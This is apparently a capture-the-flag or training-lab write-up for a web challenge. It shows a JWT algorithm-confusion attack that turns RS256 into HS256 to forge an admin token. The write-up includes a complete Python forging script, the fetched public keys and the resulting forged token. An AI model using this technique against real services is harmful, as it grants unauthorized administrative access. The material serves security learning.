---

Name: Halftone Studio
Difficulty: Medium
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/03/mirrored
Description: Halftone Studio, founded 2021, routes orders from about eight hundred indie merch storefronts to a shifting roster of printers across three continents. The platform migrated off raw API keys to a new in-house auth layer last quarter, a contractor shipped it on a tight cutover window, and the senior engineer who would have read the verifier code closely had already given notice. With a Series A data room opening next month the compliance team wants a third-party look first. 

---

## Enumeration

I created a normal account and received the following JWT:

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Im1haW4ifQ.eyJzdWIiOiJib2JAZ21haWwuY29tIiwibmFtZSI6ImJvYiIsInJvbGUiOiJjdXN0b21lciIsImJyYW5kIjoid2FrYSIsImlhdCI6MTc4NzA3NzY2MiwiZXhwIjoxNzg3MTA2NDYyfQ.pZK0tm-rjvgS1ERCiR6qBcEgy97HhNRFE7Q9cxxgnkfhVfom1msXutKNolVSMKtaa5TRawOyTCx2-OzEySFsdYdZ84plWOEnWbMGQwRbWszBQWONIsSJvQ1yyssf_Vlgt8hFE2zH7xZU582nP5AaMSo1bRBXyoXQQmQn9lJpcV2tI_U2ExxWyhWBs0xbxmL7_RaTI_dIL5hYa7mK69nNpmcAjElyaIga1UTYiDbUFH-IqPPuIjsl7xOq2eTN55gdAuM13r4DrzzPBZ77_GYTX5RRT6tT9EY6btNqdaFaQRm8bG_KsK4rIXaq0sJn5jgSSmdNh50evk6OEeQfX1df2g
```

Decoding the JWT gives the following header:

```json
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "main"
}
```

and payload:

```json
{
  "sub": "bob@gmail.com",
  "name": "bob",
  "role": "customer",
  "brand": "waka",
  "iat": 1787077662,
  "exp": 1787106462
}
```

The interesting part is:

```text
alg = RS256
kid = main
role = customer
```

Since RS256 uses an RSA private key to create signatures, my first thought was that I would need the private key to forge a token.

I considered three possibilities:

1. Trick the application into accepting another algorithm.
2. Trick it into using another key.
3. Find or recover the signing key.

The first option looked particularly interesting because JWT implementations can be vulnerable to **algorithm confusion**, where a server expects an RSA-signed JWT but can be tricked into treating the RSA public key as an HMAC secret.

## Finding the Public Key

I checked the API documentation at `/docs/api`.

The documentation contained:

```text
Every request must carry a JWT bearer token in the Authorization header, or the same token in the ht_token cookie when calling from a browser session. Tokens are signed RS256 with a 2048-bit RSA key; the current public key is published in JWK form at /.well-known/jwks.json and in PEM form at /public.pem for OpenSSL-style integrations.
```

This immediately gave me two useful endpoints:

```text
/.well-known/jwks.json
/public.pem
```

I queried the JWK endpoint:

```bash
curl https://3cd3d73b-5330-mirrored-82fb5.challenges.webverselabs-pro.com/.well-known/jwks.json | jq
```

The response contained:

```json
{
  "keys": [
    {
      "alg": "RS256",
      "e": "AQAB",
      "kid": "main",
      "kty": "RSA",
      "n": "zQS9284gWyzS-E-Ixz1O4Fqn87AfzcXA7E1jUul7PJzNwNP2hTdI8SU9cX7fcBt4JfcNrVI_oBKiDes-ZotB1aVMaP0uNu5_7NOZ7oycAiERW0wYgCVbpwCueCla7mDGbHrF9KEXn3yWRAQh6IF_45DqoSIrFC3-3e-W8qxjenXBMUjPuN8SDVLAxjPWfrXXsvOGIgOrj2yaaL1AnqLNtT8bIi8O9P_OLbaos3Fg0Msp2I6qpN6EX60whoyOQ4_Mh0diiX86W5Tp1BhOa2Tm0H0N_VvAtZc2utIFY6SJTiz6l9a7J0n7PxLPGa0Iub5aoAPGs8DzFgpHI7-lOD2CVw",
      "use": "sig"
    }
  ]
}
```

The `n` field is the RSA modulus and `e` is the public exponent. The `kid` is `main`, matching the `kid` in my JWT.

At this point I had the public RSA key, but not the private key.

I also briefly considered using `rsa_sign2n`, but that was unnecessary. That tool is useful when recovering an RSA public modulus from signatures/tokens. In this case the application explicitly exposed the public key.

## Testing Algorithm Confusion

The JWT attack I wanted to test was:

```text
RS256 → HS256
```

Normally:

```text
RS256:
private RSA key → signature
public RSA key → verification
```

With HS256:

```text
HS256:
shared secret → HMAC
same secret → verification
```

A vulnerable implementation may incorrectly do this:

```text
RS256
    ↓
RSA public key

HS256
    ↓
same RSA public key used as HMAC secret
```

That would allow an attacker who knows the public key to create a valid HS256 signature.

I first tried constructing an HS256 token using the JWK modulus as the secret. That did not work.

I then tried using PyJWT with the PEM public key:

```python
jwt.encode(
    payload,
    public_key,
    algorithm="HS256",
    headers={
        "typ": "JWT",
        "alg": "HS256",
        "kid": "main"
    }
)
```

PyJWT refused to do this and returned:

```text
jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
```

This was not the target application rejecting the attack. It was PyJWT deliberately preventing the use of an asymmetric key as an HMAC secret.

## Obtaining `public.pem`

I retrieved the PEM version of the public key:

```text
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzQS9284gWyzS+E+Ixz1O
4Fqn87AfzcXA7E1jUul7PJzNwNP2hTdI8SU9cX7fcBt4JfcNrVI_oBKiDes+ZotB
1aVMaP0uNu5/7NOZ7oycAiERW0wYgCVbpwCueCla7mDGbHrF9KEXn3yWRAQh6IF/
45DqoSIrFC3+3e-W8qxjenXBMUjPuN8SDVLAxjPWfrXXsvOGIgOrj2yaaL1AnqLN
tT8bIi8O9P/OLbaos3Fg0Msp2I6qpN6EX60whoyOQ4/Mh0diiX86W5Tp1BhOa2Tm
0H0N/VvAtZc2utIFY6SJTiz6l9a7J0n7PxLPGa0Iub5aoAPGs8DzFgpHI7+lOD2C
VwIDAQAB
-----END PUBLIC KEY-----
```

I verified it with OpenSSL:

```bash
openssl rsa -pubin -in public.pem -text -noout
```

It reported:

```text
Public-Key: (2048 bit)
Exponent: 65537 (0x10001)
```

So the public key was valid.

## Creating the Forged Token

Instead of using PyJWT to generate the HS256 signature, I generated the HMAC-SHA256 signature directly.

The important detail is that the **PEM public key itself** is used as the HMAC secret.

```python
import base64
import hashlib
import hmac
import json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=")

header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "main"
}

payload = {
    "sub": "admin@gmail.com",
    "name": "administrator",
    "role": "admin",
    "brand": "waka",
    "iat": 1787077662,
    "exp": 1787106462
}

header_b64 = b64url(
    json.dumps(header, separators=(",", ":")).encode()
)

payload_b64 = b64url(
    json.dumps(payload, separators=(",", ":")).encode()
)

message = header_b64 + b"." + payload_b64

with open("public.pem", "rb") as f:
    public_key = f.read()

signature = hmac.new(
    public_key,
    message,
    hashlib.sha256
).digest()

token = (
    message + b"." + b64url(signature)
).decode()

print(token)
```

The generated token was:

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Im1haW4ifQ.eyJzdWIiOiJhZG1pbkBnbWFpbC5jb20iLCJuYW1lIjoiYWRtaW5pc3RyYXRvciIsInJvbGUiOiJhZG1pbiIsImJyYW5kIjoid2FrYSIsImlhdCI6MTc4NzA3NzY2MiwiZXhwIjoxNzg3MTA2NDYyfQ.hp4g7xjlf-lUTBXLOtL-rw2kahV2Olxfg_2e0kE4x5U
```

The important changes from the original token are:

```text
alg:  RS256 → HS256
role: customer → admin
name: bob → administrator
sub:  bob@gmail.com → admin@gmail.com
```

The `kid` remains:

```text
main
```

## Why It Works

The attack succeeds because the server appears to trust the algorithm specified by the attacker-controlled JWT header.

The normal flow is supposed to be:

```text
JWT
 ↓
alg = RS256
 ↓
RSA verification
 ↓
public RSA key
```

But after changing the header to:

```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "main"
}
```

the vulnerable verifier treats the same RSA public key as an HMAC secret.

Conceptually, the server is doing something equivalent to:

```text
if alg == RS256:
    verify RSA signature with public_key

if alg == HS256:
    verify HMAC with public_key
```

The second behavior is the vulnerability.

I don't need the RSA private key because I am not creating an RS256 signature. I am creating an HS256 signature using the publicly available RSA public key as the HMAC secret.

The attack therefore becomes:

```text
Original JWT
    |
    | RS256
    v
RSA private key
    |
    v
signature


Forged JWT
    |
    | HS256
    v
RSA PUBLIC KEY
    |
    v
HMAC-SHA256 signature
```

Since the application incorrectly accepts the second case, the forged token is considered valid.

## Result

The original token identified me as:

```json
{
  "sub": "bob@gmail.com",
  "name": "bob",
  "role": "customer",
  "brand": "waka"
}
```

The forged token instead contains:

```json
{
  "sub": "admin@gmail.com",
  "name": "administrator",
  "role": "admin",
  "brand": "waka"
}
```

Because the server accepted the forged HS256 signature, the `role=admin` claim was trusted and I obtained administrative access.
